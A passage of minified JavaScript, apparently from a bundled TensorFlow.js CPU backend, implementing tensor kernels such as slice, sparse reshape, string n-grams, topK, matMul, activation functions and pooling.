            return wt(e, t.dtype);
        const p = c instanceof xe ? c : wt(u, t.dtype);
        "string" == typeof c || "number" == typeof c ? p.values.fill(c) : "boolean" == typeof c && p.values.fill(+c);
        for (let f = 0; f < r; f++) {
            const m = [];
            let g = 0;
            for (let b = 0; b < i; b++) {
                const x = d[f * i + b];
                m.push(x),
                g += x * a[b]
            }
            if (g < 0 || g >= s / o)
                throw new Error(`Invalid indices: ${m} does not index into ${e}`);
            for (let b = 0; b < o; b++)
                l ? p.values[g * o + b] += h[f * o + b] : p.values[g * o + b] = 0 === t.rank ? h[0] : h[f * o + b]
        }
        return p
    }
    const RL = Jn((n=>1 / (1 + Math.exp(-n))))
      , Ny = Et(li, (n=>1 / (1 + Math.exp(-n))))
      , $L = {
        kernelName: li,
        backendName: "cpu",
        kernelFunc: Ny
    };
    function Ry(n, t, e, s, o) {
        const r = eh(s, t, e)
          , i = Z(e)
          , a = ct(s);
        if (r) {
            const d = nh(t, a);
            return "string" === o ? n.slice(d, d + i) : n.subarray(d, d + i)
        }
        const l = wt(s, o, "string" === o ? cs(n) : n)
          , u = wt(e, o);
        for (let d = 0; d < u.size; ++d) {
            const h = u.indexToLoc(d)
              , p = h.map(((f,m)=>f + t[m]));
            u.set(l.get(...p), ...h)
        }
        return "string" === o ? Jg(u.values) : u.values
    }
    function wo(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {begin: r, size: i} = s;
        it(o, "slice");
        const [a,c] = zc(o, r, i);
        qd(o, a, c);
        const u = Ry(e.data.get(o.dataId).values, a, c, o.shape, o.dtype);
        return e.makeTensorInfo(c, o.dtype, u)
    }
    const GL = {
        kernelName: dc,
        backendName: "cpu",
        kernelFunc: wo
    };
    function $y(n, t, e, s, o, r, i) {
        const a = t[0]
          , c = r[0]
          , l = new Array(c)
          , u = new Array(a)
          , d = t[1];
        if (0 === c) {
            if (0 !== a)
                throw new Error(zg(a));
            return [qt(e, 0), [0, d], qt(o, 0), l, u]
        }
        let h = !0
          , p = 0;
        const f = new Array(c).fill(0);
        for (let g = 0; g < a; ++g) {
            const b = n[g * d];
            if (b < 0)
                throw new Error(Xg(g, b));
            if (b >= c)
                throw new Error(Ag(g, b, c));
            ++f[b],
            h = h && b >= p,
            p = b
        }
        let m = !0;
        for (let g = 0; g < c; ++g) {
            const b = 0 === f[g];
            l[g] = b,
            m = m && !b,
            f[g] = Math.max(f[g], 1),
            g > 0 && (f[g] += f[g - 1])
        }
        if (m && h) {
            const g = n
              , b = s;
            for (let x = 0; x < a; ++x)
                u[x] = x;
            return [g, [a, d], b, l, u]
        }
        {
            const g = f[c - 1]
              , b = qt(e, g * d)
              , x = qt(o, g)
              , I = new Array(c).fill(0);
            for (let y = 0; y < a; ++y) {
                const w = n[y * d]
                  , C = I[w]
                  , k = (0 === w ? 0 : f[w - 1]) + C;
                I[w]++;
                for (let S = 0; S < d; ++S)
                    b[k * d + S] = n[y * d + S];
                x[k] = s[y],
                u[y] = k
            }
            for (let y = 0; y < c; ++y)
                if (0 === I[y]) {
                    const C = 0 === y ? 0 : f[y - 1];
                    b[C * d + 0] = y;
                    for (let k = 1; k < d; ++k)
                        b[C * d + k] = 0;
                    x[C] = i
                }
            return [b, [g, d], x, l, u]
        }
    }
    function Gy(n, t, e, s, o) {
        const r = Z(s)
          , i = t[0]
          , a = o.length
          , c = [];
        let l = 1
          , u = -1;
        for (let g = 0; g < a; ++g) {
            const b = o[g];
            if (-1 === b) {
                if (-1 !== u)
                    throw new Error(Pg(u, g));
                u = g,
                c.push(1)
            } else {
                if (b < 0)
                    throw new Error(Og(g, b));
                l *= b,
                c.push(b)
            }
        }
        if (-1 !== u) {
            if (l <= 0)
                throw new Error("reshape cannot infer the missing input size for an empty tensor unless all specified input sizes are non-zero");
            const g = Math.trunc(r / l);
            if (l * g !== r)
                throw new Error(Zg(s, c));
            c[u] = g
        }
        if (Z(c) !== r)
            throw new Error(Bg(s, c));
        const h = s.length
          , p = [];
        if (h > 0) {
            p[h - 1] = 1;
            for (let g = h - 2; g >= 0; --g)
                p[g] = p[g + 1] * s[g + 1]
        }
        const f = [];
        if (a > 0) {
            f[a - 1] = 1;
            for (let g = a - 2; g >= 0; --g)
                f[g] = f[g + 1] * c[g + 1]
        }
        const m = qt(e, i * a);
        for (let g = 0; g < i; ++g) {
            let b = 0;
            for (let x = 0; x < h; ++x)
                b += n[g * h + x] * p[x];
            for (let x = 0; x < a; ++x)
                m[g * a + x] = Math.trunc(b / f[x]),
                b %= f[x]
        }
        return [m, [i, a], c]
    }
    function pp(n, t, e, s, o, r=!1, i=0) {
        const a = s.length
          , c = [t[0], n.length / t[0]]
          , l = c[1]
          , d = a > 0 ? o[a - 1] + 1 : 0;
        if (d < 0)
            throw new Error("segment ids must be >= 0");
        const h = t.slice();
        h[0] = d;
        const f = qt(e, h.reduce(((I,y)=>I * y), 1));
        if (0 === a)
            return d > 0 && f.fill(i),
            [f, h];
        if (d <= 0)
            throw new Error("segment ids must be >= 0");
        let m = 0
          , g = 1
          , b = 0
          , x = o[m];
        for (; ; ) {
            let I = 0;
            if (g < a) {
                if (I = o[g],
                x === I) {
                    ++g;
                    continue
                }
                if (x >= I)
                    throw new Error("segment ids are not increasing")
            }
            if (x < 0 || x >= d)
                throw new Error(_g(x, d));
            x > b && f.fill(i, b * l, x * l);
            for (let y = m; y < g; ++y) {
                const w = s[y];
                if (w < 0 || w >= c[0])
                    throw new Error(Ug(y, s[y], c[0]));
                for (let C = 0; C < l; C++)
                    f[x * l + C] += n[w * l + C]
            }
            if (r)
                for (let y = 0; y < l; y++)
                    f[x * l + y] /= g - m;
            if (m = g,
            ++g,
            b = x + 1,
            x = I,
            g > a)
                break
        }
        return b < d && f.fill(i, b * l, d * l),
        [f, h]
    }
    const LL = Jn((n=>Math.sqrt(n)))
      , EL = Et(di, (n=>Math.sqrt(n)))
      , DL = {
        kernelName: di,
        backendName: "cpu",
        kernelFunc: EL
    }
      , Ly = oe(((n,t)=>{
        const e = n - t;
        return e * e
    }
    ))
      , WL = pe(hi, Ly)
      , ML = {
        kernelName: hi,
        backendName: "cpu",
        kernelFunc: WL
    }
      , Ey = Jn(((n,t)=>{
        const {pattern: e, replaceGlobal: s, rewrite: o} = t;
        return n.replace(new RegExp(e,s ? "g" : ""), o)
    }
    ))
      , FL = {
        kernelName: Xu,
        backendName: "cpu",
        kernelFunc: Ms(Xu, Ey)
    };
    function Dy(n, t, e, s) {
        const o = wt(n, t.dtype);
        for (let r = 0; r < o.size; r++) {
            const i = o.indexToLoc(r)
              , a = new Array(i.length);
            for (let c = 0; c < a.length; c++)
                a[c] = i[c] * e[c] + s[c];
            o.set(t.get(...a), ...i)
        }
        return o
    }
    class zL {
        constructor(t, e, s, o, r, i) {
            this.separator = bs(t),
            this.nGramWidths = e,
            this.leftPad = bs(s),
            this.rightPad = bs(o),
            this.padWidth = r,
            this.preserveShort = i
        }
        getPadWidth(t) {
            return Math.min(this.padWidth < 0 ? t - 1 : this.padWidth, t - 1)
        }
        getNumNGrams(t, e) {
            const s = this.getPadWidth(e);
            return Math.max(0, t + 2 * s - e + 1)
        }
        createNGrams(t, e, s, o, r, i) {
            for (let a = 0; a < r; ++a) {
                const c = this.getPadWidth(i)
                  , l = Math.max(0, c - a)
                  , u = Math.max(0, c - (r - (a + 1)))
                  , d = i - (l + u)
                  , h = e + (l > 0 ? 0 : a - c);
                let p = 0;
                p += l * this.leftPad.length;
                for (let x = 0; x < d; ++x)
                    p += t[h + x].length;
                p += u * this.rightPad.length;
                p += (l + u + d - 1) * this.separator.length,
                s[o + a] = new Uint8Array(p);
                const m = s[o + a];
                let g = 0;
                const b = x=>x.forEach((I=>m[g++] = I));
                for (let x = 0; x < l; ++x)
                    b(this.leftPad),
                    b(this.separator);
                for (let x = 0; x < d - 1; ++x)
                    b(t[h + x]),
                    b(this.separator);
                if (d > 0) {
                    b(t[h + d - 1]);
                    for (let x = 0; x < u; ++x)
                        b(this.separator),
                        b(this.rightPad)
                } else {
                    for (let x = 0; x < u - 1; ++x)
                        b(this.rightPad),
                        b(this.separator);
                    b(this.rightPad)
                }
            }
        }
        compute(t, e) {
            const s = t.length
              , o = e.length;
            if (o > 0) {
                let c = e[0];
                if (0 !== c)
                    throw new Error(`First split value must be 0, got ${c}`);
                for (let l = 1; l < o; ++l) {
                    let u = e[l] >= c;
                    if (u = u && e[l] <= s,
                    !u)
                        throw new Error(`Invalid split value ${e[l]}, must be in [${c}, ${s}]`);
                    c = e[l]
                }
                if (c !== s)
                    throw new Error(`Last split value must be data size. Expected ${s}, got ${c}`)
            }
            const r = o - 1
              , i = qt("int32", o);
            if (0 === s || 0 === o) {
                const c = new Array(s);
                for (let l = 0; l <= r; ++l)
                    i[l] = 0;
                return [c, i]
            }
            i[0] = 0;
            for (let c = 1; c <= r; ++c) {
                const l = e[c] - e[c - 1];
                let u = 0;
                this.nGramWidths.forEach((d=>{
                    u += this.getNumNGrams(l, d)
                }
                )),
                this.preserveShort && l > 0 && 0 === u && (u = 1),
                i[c] = i[c - 1] + u
            }
            const a = new Array(i[r]);
            for (let c = 0; c < r; ++c) {
                const l = e[c];
                let u = i[c];
                if (this.nGramWidths.forEach((d=>{
                    const h = e[c + 1] - e[c]
                      , p = this.getNumNGrams(h, d);
                    this.createNGrams(t, l, a, u, p, d),
                    u += p
                }
                )),
                this.preserveShort && u === i[c]) {
                    const d = e[c + 1] - e[c];
                    if (0 === d)
                        continue;
                    const h = d + 2 * this.padWidth;
                    this.createNGrams(t, l, a, u, 1, h)
                }
            }
            return [a, i]
        }
    }
    function Wy(n, t, e, s, o, r, i, a) {
        return new zL(e,s,o,r,i,a).compute(n, t)
    }
    function XL(n, t, e, s) {
        if (!n.length)
            return;
        if (0 === t.length) {
            for (let r = 0; r < n.length; ++r)
                s.push(n.subarray(r, r + 1));
            return
        }
        if (1 === t.length) {
            const r = t[0];
            let i = n.indexOf(r);
            for (; -1 !== i; ) {
                const a = n.subarray(0, i);
                (!e || 0 !== a.length) && s.push(a),
                i = (n = n.subarray(i + 1)).indexOf(r)
            }
            return void ((!e || 0 !== n.length) && s.push(n))
        }
        let o = 0;
        for (let r = 0; r < n.length + 1; r++)
            if (r === n.length || -1 !== t.indexOf(n[r])) {
                const i = n.subarray(o, r);
                (!e || 0 !== i.length) && s.push(i),
                o = r + 1
            }
    }
    function My(n, t, e) {
        const s = n.length
          , o = [];
        let r = 0
          , i = 0;
        const a = new Array(s);
        for (let h = 0; h < s; ++h) {
            const p = o.length;
            XL(n[h], t, e, o);
            const f = o.length - p;
            a[h] = f,
            r += f,
            i = Math.max(i, f)
        }
        const c = qt("int32", 2 * r)
          , l = new Array(r)
          , u = [s, i];
        let d = 0;
        for (let h = 0; h < s; ++h)
            for (let p = 0; p < a[h]; ++p)
                c[2 * d] = h,
                c[2 * d + 1] = p,
                l[d] = o[d],
                ++d;
        return [c, l, u]
    }
    function Vy(n, t) {
        const e = qt("int32", n.length);
        for (let s = 0; s < n.length; ++s)
            e[s] = Sw(n[s]).modulo(t).getLowBitsUnsigned();
        return e
    }
    const Fy = oe(((n,t)=>n - t))
      , AL = lp(((n,t,e,s)=>({
        real: n - e,
        imag: t - s
    })))
      , fp = pe(pi, Fy, AL)
      , PL = {
        kernelName: pi,
        backendName: "cpu",
        kernelFunc: fp
    };
    function zy(n, t) {
        const e = new Array(n.rank);
        for (let o = 0; o < e.length; o++)
            e[o] = n.shape[o] * t[o];
        const s = wt(e, n.dtype);
        for (let o = 0; o < s.values.length; ++o) {
            const r = s.indexToLoc(o)
              , i = new Array(n.rank);
            for (let c = 0; c < i.length; c++)
                i[c] = r[c] % n.shape[c];
            const a = n.locToIndex(i);
            s.values[o] = n.values[a]
        }
        return s
    }
    const ta = (n,t)=>{
        const e = t.value - n.value;
        return 0 === e ? n.index - t.index : e
    }
    ;
    function Xy(n, t, e=0, s=n.length - 1) {
        for (; s > e; ) {
            if (s - e > 600) {
                const a = s - e + 1
                  , c = t - e + 1
                  , l = Math.log(a)
                  , u = .5 * Math.exp(2 * l / 3)
                  , d = .5 * Math.sqrt(l * u * (a - u) / a) * Math.sign(c - a / 2);
                Xy(n, t, Math.max(e, Math.floor(t - c * u / a + d)), Math.min(s, Math.floor(t + (a - c) * u / a + d)))
            }
            const o = n[t];
            let r = e
              , i = s;
            for (Eo(n, e, t),
            ta(n[s], o) > 0 && Eo(n, e, s); r < i; ) {
                for (Eo(n, r, i),
                r++,
                i--; ta(n[r], o) < 0; )
                    r += 1;
                for (; ta(n[i], o) > 0; )
                    i -= 1
            }
            0 === ta(n[e], o) ? Eo(n, e, i) : (i += 1,
            Eo(n, i, s)),
            i <= t && (e = i + 1),
            t <= i && (s = i - 1)
        }
    }
    function Ay(n, t, e, s, o) {
        const r = t[t.length - 1]
          , [i,a] = [n.length / r, r]
          , c = Se(e, i * s)
          , l = Se("int32", i * s);
        for (let d = 0; d < i; d++) {
            const h = d * a
              , p = n.subarray(h, h + a);
            let f = new Array(p.length);
            p.forEach(((x,I)=>f[I] = {
                value: x,
                index: I
            })),
            s < f.length && (Xy(f, s),
            f = f.slice(0, s)),
            o && f.sort(ta);
            const m = d * s
              , g = c.subarray(m, m + s)
              , b = l.subarray(m, m + s);
            for (let x = 0; x < s; x++)
                g[x] = f[x].value,
                b[x] = f[x].index
        }
        const u = t.slice();
        return u[u.length - 1] = s,
        [wt(u, e, c), wt(u, "int32", l)]
    }
    function Py(n, t, e, s) {
        const o = It(t, e)[0]
          , r = [1, e[0], 1];
        for (let f = 0; f < o; f++)
            r[0] *= e[f];
        r[1] = e[o];
        for (let f = o + 1; f < e.length; f++)
            r[2] *= e[f];
        const i = new Map
          , a = new Int32Array(e[o])
          , c = new xe(r,s,n)
          , l = []
          , u = 1 === r[0] && 1 === r[2];
        for (let f = 0; f < e[o]; f++) {
            let m;
            if (u)
                m = n[f].toString();
            else {
                const b = [];
                for (let x = 0; x < r[0]; x++)
                    for (let I = 0; I < r[2]; I++)
                        b.push(c.get(x, f, I));
                m = b.join(",")
            }
            const g = i.get(m);
            if (null != g)
                a[f] = g;
            else {
                const b = i.size;
                i.set(m, b),
                a[f] = b,
                l.push(f)
            }
        }
        const d = r.slice();
        d[1] = i.size;
        const h = new xe(d,s);
        l.forEach(((f,m)=>{
            for (let g = 0; g < r[0]; g++)
                for (let b = 0; b < r[2]; b++)
                    h.set(c.get(g, f, b), g, m, b)
        }
        ));
        const p = e.slice();
        return p[o] = d[1],
        {
            outputValues: h.values,
            outputShape: p,
            indices: a
        }
    }
    const OL = Object.freeze(Object.defineProperty({
        __proto__: null,
        addImpl: Hx,
        bincountImpl: up,
        bincountReduceImpl: _x,
        bitwiseAndImpl: Ux,
        castImpl: Bx,
        ceilImpl: Yx,
        concatImpl: Qx,
        equalImpl: Jx,
        expImpl: qx,
        expm1Impl: ey,
        floorDivImpl: sy,
        floorImpl: ny,
        gatherNdImpl: oy,
        gatherV2Impl: ry,
        greaterEqualImpl: ay,
        greaterImpl: iy,
        lessEqualImpl: ly,
        lessImpl: cy,
        linSpaceImpl: uy,
        logImpl: dy,
        maxImpl: hy,
        maximumImpl: py,
        minimumImpl: fy,
        multiplyImpl: dp,
        negImpl: my,
        notEqualImpl: gy,
        prodImpl: by,
        raggedGatherImpl: yy,
        raggedRangeImpl: wy,
        raggedTensorToTensorImpl: Sy,
        rangeImpl: ky,
        rsqrtImpl: Ty,
        scatterImpl: Io,
        sigmoidImpl: RL,
        simpleAbsImpl: Zx,
        sliceImpl: Ry,
        sparseFillEmptyRowsImpl: $y,
        sparseReshapeImpl: Gy,
        sparseSegmentReductionImpl: pp,
        sqrtImpl: LL,
        squaredDifferenceImpl: Ly,
        staticRegexReplaceImpl: Ey,
        stridedSliceImpl: Dy,
        stringNGramsImpl: Wy,
        stringSplitImpl: My,
        stringToHashBucketFastImpl: Vy,
        subImpl: Fy,
        tileImpl: zy,
        topKImpl: Ay,
        transposeImpl: hp,
        uniqueImpl: Py
    }, Symbol.toStringTag, {
        value: "Module"
    }));
    bm("cpu", (()=>new hl), 1);
    const Oy = Et(Vr, (n=>n >= 0 ? n : Math.exp(n) - 1))
      , KL = {
        kernelName: Vr,
        backendName: "cpu",
        kernelFunc: Oy
    };
    function Ky(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {alpha: r} = s;
        it([o], "leakyRelu");
        const i = Z(o.shape)
          , a = e.data.get(o.dataId).values
          , c = Se("float32", i);
        for (let l = 0; l < a.length; l++)
            c[l] = a[l] < 0 ? r * a[l] : a[l];
        return e.makeTensorInfo(o.shape, "float32", c)
    }
    const ZL = {
        kernelName: Xa,
        backendName: "cpu",
        kernelFunc: Ky
    }
      , BL = oe(((n,t)=>n < 0 ? t * n : n));
    function Zy(n) {
        const {inputs: t, backend: e} = n
          , {x: s, alpha: o} = t;
        it([s, o], "prelu");
        const r = e.data.get(s.dataId).values
          , i = e.data.get(o.dataId).values
          , [a,c] = BL(s.shape, o.shape, r, i, "float32");
        return e.makeTensorInfo(c, "float32", a)
    }
    const HL = {
        kernelName: oc,
        backendName: "cpu",
        kernelFunc: Zy
    }
      , By = Et(ei, (n=>Math.max(0, n)))
      , _L = {
        kernelName: ei,
        backendName: "cpu",
        kernelFunc: By
    }
      , Hy = Et(ni, (n=>Math.min(Math.max(0, n), 6)))
      , UL = {
        kernelName: ni,
        backendName: "cpu",
        kernelFunc: Hy
    };
    function gl(n, t, e, s, o) {
        if ("linear" === e)
            return Qn({
                inputs: {
                    x: t
                },
                backend: n
            });
        if ("relu" === e)
            return By({
                inputs: {
                    x: t
                },
                backend: n
            });
        if ("elu" === e)
            return Oy({
                inputs: {
                    x: t
                },
                backend: n
            });
        if ("relu6" === e)
            return Hy({
                inputs: {
                    x: t
                },
                backend: n
            });
        if ("prelu" === e)
            return Zy({
                inputs: {
                    x: t,
                    alpha: s
                },
                backend: n
            });
        if ("leakyrelu" === e)
            return Ky({
                inputs: {
                    x: t
                },
                backend: n,
                attrs: {
                    alpha: o
                }
            });
        if ("sigmoid" === e)
            return Ny({
                inputs: {
                    x: t
                },
                backend: n
            });
        throw new Error(`Activation ${e} has not been implemented for the CPU backend.`)
    }
    function At(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {x: o} = t
          , {shape: r} = s
          , i = Z(o.shape)
          , a = df(r, i)
          , c = Z(a);
        v(i === c, (()=>`The new shape (${a}) has ${c} elements and the old shape (${o.shape}) has ${i} elements. The new shape and old shape must have the same number of elements.`)),
        e.incRef(o.dataId);
        const l = e.data.get(o.dataId);
        if (null != l.complexTensorInfos) {
            const u = l.complexTensorInfos.real
              , d = l.complexTensorInfos.imag;
            u.shape = a,
            d.shape = a
        }
        return {
            dataId: o.dataId,
            shape: a,
            dtype: o.dtype
        }
    }
    const YL = {
        kernelName: ic,
        backendName: "cpu",
        kernelFunc: At
    };
    function _y(n) {
        const {inputs: t, backend: e, attrs: s} = n
          , {a: o, b: r} = t
          , {transposeA: i, transposeB: a} = s;
        it([o, r], "matMul");
        const c = o.shape.length
          , l = r.shape.length
          , u = i ? o.shape[c - 2] : o.shape[c - 1]
          , d = a ? r.shape[l - 1] : r.shape[l - 2]
          , h = i ? o.shape[c - 1] : o.shape[c - 2]
          , p = a ? r.shape[l - 2] : r.shape[l - 1]
          , f = o.shape.slice(0, -2)
          , m = r.shape.slice(0, -2)
          , g = Z(f)
          , b = Z(m)
          , I = gt(o.shape.slice(0, -2), r.shape.slice(0, -2)).concat([h, p]);
        v(u === d, (()=>`Error in matMul: inner shapes (${u}) and (${d}) of Tensors with shapes ${o.shape} and ${r.shape} and transposeA=${i} and transposeB=${a} must match.`));
        const w = a ? [b, p, d] : [b, d, p]
          , C = At({
            inputs: {
                x: o
            },
            backend: e,
            attrs: {
                shape: i ? [g, u, h] : [g, h, u]
            }
        })
          , k = At({
            inputs: {
                x: r
            },
            backend: e,
            attrs: {
                shape: w
            }
        })
          , S = i ? C.shape[1] : C.shape[2]
          , T = i ? C.shape[2] : C.shape[1]
          , R = a ? k.shape[1] : k.shape[2]
          , L = Math.max(g, b)
          , V = e.data.get(C.dataId).values
          , F = e.data.get(k.dataId).values
          , X = ct(C.shape)
          , A = ct(k.shape)
          , [P,B,K] = i ? [X[0], 1, X[1]] : [X[0], X[1], 1]
          , [H,U,Y] = a ? [1, A[1], A[0]] : [A[1], 1, A[0]]
          , j = T * R
          , J = wt([L, T, R], C.dtype)
          , nt = J.values
          , q = e.blockSize;
        for (let rt = 0; rt < L; rt++) {
            const lt = rt % g
              , ft = rt % b;
            for (let ht = 0; ht < T; ht += q) {
                const xt = Math.min(ht + q, T);
                for (let yt = 0; yt < R; yt += q) {
                    const Dt = Math.min(yt + q, R);
                    for (let Pt = 0; Pt < S; Pt += q) {
                        const jt = Math.min(Pt + q, S);
                        for (let Ot = ht; Ot < xt; Ot++)
                            for (let Mt = yt; Mt < Dt; Mt++) {
                                let Jt = 0;
                                for (let Ut = Pt; Ut < jt; Ut++) {
                                    Jt += V[lt * P + Ot * B + Ut * K] * F[Ut * H + Mt * U + ft * Y]
                                }
                                nt[rt * j + (Ot * R + Mt)] += Jt
                            }
                    }
                }
            }
        }
        return e.disposeIntermediateTensorInfo(C),
        e.disposeIntermediateTensorInfo(k),
        e.makeTensorInfo(I, J.dtype, J.values)
    }
    const QL = {
        kernelName: Sa,
        backendName: "cpu",
        kernelFunc: _y
    };
    const jL = {
        kernelName: yc,
        backendName: "cpu",
        kernelFunc: function JL(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {a: o, b: r, bias: i, preluActivationWeights: a} = t
              , {transposeA: c, transposeB: l, activation: u, leakyreluAlpha: d} = s;
            let h, p, f;
            const m = [];
            h = _y({
                inputs: {
                    a: o,
                    b: r
                },
                attrs: {
                    transposeA: c,
                    transposeB: l
                },
                backend: e
            }),
            i && (p = ir({
                inputs: {
                    a: h,
                    b: i
                },
                backend: e
            }),
            m.push(h),
            h = p),
            u && (f = gl(e, h, u, a, d),
            m.push(h),
            h = f);
            for (const b of m)
                e.disposeIntermediateTensorInfo(b);
            return h
        }
    }
      , qL = Et(vr, (n=>Math.acos(n)))
      , tE = {
        kernelName: vr,
        backendName: "cpu",
        kernelFunc: qL
    }
      , eE = Et(Sr, (n=>Math.acosh(n)))
      , nE = {
        kernelName: Sr,
        backendName: "cpu",
        kernelFunc: eE
    };
    const oE = {
        kernelName: nu,
        backendName: "cpu",
        kernelFunc: function sE(n) {
            const {inputs: t, backend: e} = n
              , s = t;
            it(t, "addN");
            const o = s.map((a=>e.data.get(a.dataId).values))
              , r = wt(s[0].shape, s[0].dtype)
              , i = r.values;
            for (let a = 0; a < s.length; a++) {
                const c = o[a];
                for (let l = 0; l < i.length; l++)
                    i[l] += c[l]
            }
            return e.makeTensorInfo(r.shape, r.dtype, r.values)
        }
    };
    const iE = {
        kernelName: "All",
        backendName: "cpu",
        kernelFunc: function rE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s;
            it(o, "all");
            const a = It(r, o.shape);
            let c = a;
            const l = Yt(c, o.shape.length);
            let u = o;
            null != l && (u = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: l
                }
            }),
            c = ee(c.length, o.shape.length)),
            Ie("all", c, u.shape.length);
            const [d,h] = me(u.shape, c)
              , p = Z(h)
              , f = ke(Z(d), u.dtype)
              , m = e.data.get(u.dataId).values;
            for (let b = 0; b < f.length; ++b) {
                const x = b * p;
                let I = m[x];
                for (let y = 0; y < p; ++y) {
                    const w = m[x + y];
                    I = I && w
                }
                f[b] = I
            }
            null != l && e.disposeIntermediateTensorInfo(u);
            const g = e.makeTensorInfo(d, u.dtype, f);
            if (i) {
                const x = At({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: re(d, a)
                    }
                });
                return e.disposeIntermediateTensorInfo(g),
                x
            }
            return g
        }
    };
    const cE = {
        kernelName: "Any",
        backendName: "cpu",
        kernelFunc: function aE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r, keepDims: i} = s;
            it(o, "any");
            const a = It(r, o.shape);
            let c = a;
            const l = Yt(c, o.shape.length);
            let u = o;
            null != l && (u = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: l
                }
            }),
            c = ee(c.length, o.shape.length)),
            Ie("any", c, u.shape.length);
            const [d,h] = me(u.shape, c)
              , p = Z(h)
              , f = ke(Z(d), u.dtype)
              , m = e.data.get(u.dataId).values;
            for (let b = 0; b < f.length; ++b) {
                const x = b * p;
                let I = m[x];
                for (let y = 0; y < p; ++y) {
                    const w = m[x + y];
                    I = I || w
                }
                f[b] = I
            }
            null != l && e.disposeIntermediateTensorInfo(u);
            const g = e.makeTensorInfo(d, u.dtype, f);
            if (i) {
                const x = At({
                    inputs: {
                        x: g
                    },
                    backend: e,
                    attrs: {
                        shape: re(d, a)
                    }
                });
                return e.disposeIntermediateTensorInfo(g),
                x
            }
            return g
        }
    };
    const uE = {
        kernelName: Ia,
        backendName: "cpu",
        kernelFunc: function lE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r} = s;
            it(o, "argMax");
            let i = It(r, o.shape);
            const a = Yt(i, o.shape.length);
            let c = o;
            const l = [];
            null != a && (c = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: a
                }
            }),
            l.push(c),
            i = ee(i.length, c.shape.length)),
            i = [i[0]],
            Ie("argMax", i, c.shape.length);
            const [u,d] = me(c.shape, i)
              , p = ke(Z(u), "int32")
              , f = Z(d)
              , m = e.data.get(c.dataId).values;
            for (let g = 0; g < p.length; ++g) {
                const b = g * f;
                let x = m[b]
                  , I = 0;
                for (let y = 0; y < f; ++y) {
                    const w = m[b + y];
                    w > x && (x = w,
                    I = y)
                }
                p[g] = I
            }
            return l.forEach((g=>e.disposeIntermediateTensorInfo(g))),
            e.makeTensorInfo(u, "int32", p)
        }
    };
    const hE = {
        kernelName: wa,
        backendName: "cpu",
        kernelFunc: function dE(n) {
            const {inputs: t, backend: e, attrs: s} = n
              , {x: o} = t
              , {axis: r} = s;
            it(o, "argMin");
            let i = It(r, o.shape);
            const a = Yt(i, o.shape.length);
            let c = o;
            const l = [];
            null != a && (c = Ke({
                inputs: {
                    x: o
                },
                backend: e,
                attrs: {
                    perm: a
                }
            }),
            l.push(c),
            i = ee(i.length, c.shape.length)),
            i = [i[0]],
            Ie("argMin", i, c.shape.length);
            const [u,d] = me(c.shape, i)
              , p = ke(Z(u), "int32")
              , f = Z(d)
              , m = e.data.get(c.dataId).values;
            for (let g = 0; g < p.length; ++g) {
                const b = g * f;
                let x = m[b]
                  , I = 0;
                for (let y = 0; y < f; ++y) {
                    const w = m[b + y];
                    w < x && (x = w,
                    I = y)
                }
                p[g] = I
            }
            return l.forEach((g=>e.disposeIntermediateTensorInfo(g))),
            e.makeTensorInfo(u, "int32", p)
        }
    }
      , pE = Et(kr, (n=>Math.asin(n)))
      , fE = {
        kernelName: kr,
        backendName: "cpu",
        kernelFunc: pE
    }
      , mE = Et(Tr, (n=>Math.asinh(n)))
      , gE = {
        kernelName: Tr,
        backendName: "cpu",
        kernelFunc: mE
    }
      , bE = Et(Nr, (n=>Math.atan(n)))
      , xE = {
        kernelName: Nr,
        backendName: "cpu",
        kernelFunc: bE
    }
      , yE = oe(((n,t)=>Math.atan2(n, t)))
      , IE = pe($r, yE)
      , wE = {
        kernelName: $r,
        backendName: "cpu",
        kernelFunc: IE
    }
      , CE = Et(Rr, (n=>Math.atanh(n)))
      , vE = {
        kernelName: Rr,
        backendName: "cpu",
        kernelFunc: CE
    };
    function mp(n, t, e, s, o, r) {
        const i = o.strideHeight
          , a = o.strideWidth
          , c = o.dilationHeight
          , l = o.dilationWidth
          , u = o.effectiveFilterHeight
          , d = o.effectiveFilterWidth
          , h = o.padInfo.top
          , p = o.padInfo.left
          , f = "max" === r ? Number.NEGATIVE_INFINITY : Number.POSITIVE_INFINITY
          , m = wt(o.outShape, e)
          , g = m.values
          , b = o.outShape[1] * o.outShape[2] * o.outShape[3]
          , x = o.outShape[2] * o.outShape[3]
          , I = o.outShape[3];
        for (let y = 0; y < o.batchSize; ++y) {
            const w = y * b
              , C = y * s[0];
            for (let k = 0; k < o.inChannels; ++k)
                for (let S = 0; S < o.outHeight; ++S) {
                    const T = S * i - h
                      , R = Math.max(0, T)
                      , L = Math.min(o.inHeight, u + T)
                      , V = w + S * x;
                    for (let F = 0; F < o.outWidth; ++F) {
                        const X = F * a - p
                          , A = Math.max(0, X)
                          , P = Math.min(o.inWidth, d + X);
                        let B = f
                          , K = 0
                          , H = 0;
                        for (let Y = R; Y < L; Y += c) {
                            const j = C + Y * s[1];
                            for (let J = A; J < P; J += l) {
                                const q = n[j + J * s[2] + k];
                                "max" === r && q > B ? B = q : "avg" === r && (K += q,
                                H++)
                            }
                            if (isNaN(B))
                                break
                        }
                        g[V + F * I + k] = "avg" === r ? K / H : B
                    }
                }
        }
        return m
    }
    function Uy(n, t, e, s, o=!1, r=!1) {
        const i = wt(s.outShape, "int32")
          , a = s.strideHeight
          , c = s.strideWidth
          , l = s.dilationHeight
          , u = s.dilationWidth
          , d = s.effectiveFilterHeight
          , h = s.effectiveFilterWidth
          , p = s.padInfo.top
          , f = s.padInfo.left
          , m = wt(t, e, n);
        for (let g = 0; g < s.batchSize; ++g)
            for (let b = 0; b < s.inChannels; ++b)
                for (let x = 0; x < s.outHeight; ++x) {
                    const I = x * a - p;
                    let y = I;
                    for (; y < 0; )
                        y += l;
                    const w = Math.min(s.inHeight, d + I);
